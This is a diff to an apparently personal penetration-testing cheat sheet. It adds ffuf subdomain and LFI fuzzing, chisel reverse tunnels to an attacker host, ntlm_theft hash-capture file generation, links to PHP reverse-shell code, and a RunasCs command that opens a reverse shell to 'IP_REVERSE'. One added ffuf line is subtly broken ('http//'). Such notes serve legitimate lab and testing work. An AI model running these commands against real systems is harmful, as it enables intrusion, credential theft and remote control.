@@ -57,10 +57,14 @@ curl -ks 'URL'
 - davtest ![GitHub Repo stars](https://img.shields.io/github/stars/cldrn/davtest?style=social)
 - ffuf ![GitHub Repo stars](https://img.shields.io/github/stars/ffuf/ffuf?style=social)
 ```sh
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ/
-ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u 'URL'/FUZZ
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://'URL'/FUZZ
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http//'URL'/FUZZ/
+ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://'URL'/FUZZ
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://'URL'/FUZZ -e .sh
+# subdomain
+ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.DOMAIN' -u http://'URL' -fs 'RESPONSE_SIZE'
+# lfi
+ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u http://'URL'=FUZZ -fs 'RESPONSE_SIZE'
 ```
 - nmap
 ```sh
@@ -373,6 +377,16 @@ evil-winrm -S -c 'CERT.pem' -k 'PRIVKEY.pem' -r 'DOMAIN' -i 'IP'
 ```sh
 2to3-2.7 --no-diffs -w 'FILENAME'
 ```
+- chisel  ![GitHub Repo stars](https://img.shields.io/github/stars/jpillora/chisel?style=social)
+```sh
+https://jieliau.medium.com/chisel-tool-for-your-lateral-movement-dd3fb398c696
+# reverse proxy
+chisel server -p 'IP_KALI' --reverse
+chisel client --max-retry-count 'NUM' 'IP_SERVER':'PORT_SERVER' R:'PORT':'IP_FORWARD':'PORT_FORWARD'
+# socks
+chisel server -p 'IP_KALI' --reverse --socks5
+chisel client --max-retry-count 'NUM' 'IP_SERVER':'PORT_SERVER' R:'PORT':socks
+```
 - exiftool
 ```sh
 exiftool 'FILENAME'
@@ -392,7 +406,8 @@ impacket-smbserver 'SHARENAME' 'PATH'
 # smbv1が無効の場合は
 impacket-smbserver -smb2support 'SHARENAME' 'PATH'
 ```
-- john
+- ivan-sincek ![GitHub Repo stars](https://img.shields.io/github/stars/ivan-sincek/php-reverse-shell?style=social)
+- john ![GitHub Repo stars](https://img.shields.io/github/stars/openwall/john?style=social)
 ```sh
 keepass2john passcodes.kdbx > 'OUTPUT.txt'
 pfx2jphn 'PFX' > 'OUTPUT.txt'
@@ -409,6 +424,10 @@ msfvenom -p 'PAYLOAD' LHOST='LOCALIP' LPORT='LOCALPORT' -f 'FORMAT' -o 'OUTPUT'
 ```sh
 name-that-hash -f 'hash.txt' --no-banner --no-john
 ```
+- ntlm_theft ![GitHub Repo stars](https://img.shields.io/github/stars/Greenwolf/ntlm_theft?style=social)
+```sh
+python3.13 ntlm_theft.py -g all -s 'IP_KALI' -f 'FILENAME'
+```
 - openssl ![GitHub Repo stars](https://img.shields.io/github/stars/openssl/openssl?style=social)
 ```sh
 # decrypt AES(128bit)
@@ -423,6 +442,7 @@ openssl rsa -in 'INPUT.txt' -out 'OUTPUT.txt'
 openssl pkcs12 -in 'PFX' -clcerts -nokeys -out cert.crt
 openssl pkcs12 -in 'PFX' -nocerts -out privkey.pem -nodes 
 ```
+- pentestmonkey ![GitHub Repo stars](https://img.shields.io/github/stars/pentestmonkey/php-reverse-shell?style=social)
 - phpbash ![GitHub Repo stars](https://img.shields.io/github/stars/Arrexel/phpbash?style=social)
 - pspy ![GitHub Repo stars](https://img.shields.io/github/stars/DominicBreuker/pspy?style=social)
 ```sh
@@ -485,6 +505,14 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares"
 ```powershell
 # SeBackupPrivilege
 robocopy 'SOURCE DIRECTORY' 'DEST DIRECTORY' 'SOURCE FILE' /B /NFL /NDL /NJH /NJS
+```
+- runascs ![GitHub Repo stars](https://img.shields.io/github/stars/antonioCoco/RunasCs?style=social)
+```powershell
+.\RunasCs.exe 'USERNAME' 'PASSWORD' cmd -r 'IP_REVERSE':'PORT_REVERSE'
+```
+- netstat
+```powershell
+netstat -ano -p tcp
 ```
 - sc.exe
 ```powershell
